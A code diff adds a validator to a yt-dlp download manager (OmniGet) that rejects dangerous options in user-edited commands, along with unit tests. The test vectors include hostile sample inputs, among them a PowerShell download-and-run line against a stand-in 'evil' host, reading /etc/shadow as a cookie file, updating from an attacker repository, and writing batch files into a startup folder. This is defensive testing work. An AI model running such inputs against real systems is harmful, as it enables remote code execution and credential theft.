@@ -426,12 +426,163 @@ pub fn is_dangerous_option(token: &str) -> bool {
     EXEC_LONG.iter().any(|d| *d == name || d.starts_with(name)) && lookup_exact(name).is_none()
 }
 
+/// Real yt-dlp options that are also a prefix of a dangerous option. optparse
+/// prefers an exact match, so these spellings are not abbreviations.
+const EXACT_SAFE_PREFIXES: &[&str] = &["--print", "--no-exec"];
+
+/// Dangerous options that take no value.
+const DANGEROUS_FLAGS: &[&str] = &["--update"];
+
+/// Single-dash aliases of dangerous options (`-a` batch file, `-o` output,
+/// `-P` paths, `-U` update).
+const DANGEROUS_SHORT: &[char] = &['a', 'o', 'P', 'U'];
+
+fn dangerous_long_name(name: &str) -> bool {
+    if EXACT_SAFE_PREFIXES.contains(&name) {
+        return false;
+    }
+    if DANGEROUS_LONG.contains(&name) {
+        return true;
+    }
+    name.len() >= 4
+        && DANGEROUS_LONG.iter().any(|d| d.starts_with(name))
+        && lookup_exact(name).is_none()
+}
+
+fn contains_pair(haystack: &[String], pair: &[String]) -> bool {
+    !pair.is_empty() && haystack.windows(pair.len()).any(|w| w == pair)
+}
+
+/// Validate the argv of an edited "retry with command" against the command
+/// OmniGet generated for the same download (`generated`, as recorded).
+///
+/// The edited command may change any option except the dangerous ones
+/// (running programs, reading another config or batch file, picking the
+/// ffmpeg binary, the output path, the cookie file, updating yt-dlp...).
+/// Those are only accepted when the option and its value are exactly the
+/// ones OmniGet generated.
+pub fn validate_override_argv(argv: &[String], generated: &[String]) -> Result<(), String> {
+    let mut refused: Vec<String> = Vec::new();
+    let mut i = 0;
+    while i < argv.len() {
+        let token = argv[i].trim();
+        i += 1;
+        if token == "--" {
+            break; // everything after is a URL
+        }
+        if let Some(long) = token.strip_prefix("--") {
+            let (raw_name, inline) = match long.split_once('=') {
+                Some((n, _)) => (n, true),
+                None => (long, false),
+            };
+            let name = format!("--{}", raw_name.to_ascii_lowercase());
+            if !dangerous_long_name(&name) {
+                continue;
+            }
+            let pair: Vec<String> = if inline || DANGEROUS_FLAGS.contains(&name.as_str()) {
+                vec![argv[i - 1].clone()]
+            } else if i < argv.len() {
+                i += 1;
+                vec![argv[i - 2].clone(), argv[i - 1].clone()]
+            } else {
+                vec![argv[i - 1].clone()]
+            };
+            if !contains_pair(generated, &pair) {
+                refused.extend(pair);
+            }
+            continue;
+        }
+        if let Some(short) = token.strip_prefix('-') {
+            if short.is_empty() || !short.chars().any(|c| DANGEROUS_SHORT.contains(&c)) {
+                continue;
+            }
+            let takes_value = short.len() == 1 && short != "U";
+            let pair: Vec<String> = if takes_value && i < argv.len() {
+                i += 1;
+                vec![argv[i - 2].clone(), argv[i - 1].clone()]
+            } else {
+                vec![argv[i - 1].clone()]
+            };
+            if !contains_pair(generated, &pair) {
+                refused.extend(pair);
+            }
+        }
+    }
+    if refused.is_empty() {
+        Ok(())
+    } else {
+        Err(format!(
+            "Disallowed yt-dlp argument for security: {}",
+            refused.join(" ")
+        ))
+    }
+}
+
 #[cfg(test)]
 mod tests {
     use super::*;
 
     fn v(items: &[&str]) -> Vec<String> {
         items.iter().map(|s| s.to_string()).collect()
+    }
+
+    fn generated() -> Vec<String> {
+        v(&[
+            "-f",
+            "bv*+ba/b",
+            "--ignore-config",
+            "--print",
+            "after_move:OMNIGET_FILEPATH:%(filepath)s",
+            "--ffmpeg-location",
+            "/app/bin/ffmpeg",
+            "--cookies",
+            "/app/cookies.txt",
+            "-o",
+            "/home/u/Downloads/%(title).200s [%(id)s].%(ext)s",
+            "https://example.com/watch?v=1",
+        ])
+    }
+
+    #[test]
+    fn edited_command_keeps_generated_options_and_safe_edits() {
+        let mut edited = generated();
+        edited[1] = "18".to_string();
+        edited.insert(0, "yt-dlp".to_string());
+        edited.extend(v(&["--limit-rate", "1M", "--print", "title", "--no-exec"]));
+        assert_eq!(validate_override_argv(&edited, &generated()), Ok(()));
+    }
+
+    #[test]
+    fn edited_command_rejects_execution_and_path_options() {
+        let vectors: &[&[&str]] = &[
+            &["--exec", "powershell -c iwr evil|iex"],
+            &["--exec-before-download", "sh x"],
+            &["--exec-b", "sh x"],
+            &["--EXEC=calc"],
+            &["--config-locations", "\\\\host\\share\\x.conf"],
+            &["--config-loc=/tmp/x.conf"],
+            &["--batch-file", "/tmp/urls"],
+            &["-a", "/tmp/urls"],
+            &["-ia", "/tmp/urls"],
+            &["--load-info-json", "/tmp/x.json"],
+            &["--netrc-cmd", "sh x"],
+            &["--plugin-dirs", "/tmp/p"],
+            &["--ffmpeg-location", "/tmp/evil"],
+            &["--cookies", "/etc/shadow"],
+            &["-o", "/startup/x.bat"],
+            &["-P", "/startup"],
+            &["--update-to", "attacker/yt-dlp"],
+            &["-U"],
+            &["--print-to-file", "%(id)s", "/startup/x.bat"],
+        ];
+        for vector in vectors {
+            let mut edited = generated();
+            edited.extend(v(vector));
+            assert!(
+                validate_override_argv(&edited, &generated()).is_err(),
+                "accepted {vector:?}"
+            );
+        }
     }
 
     #[test]
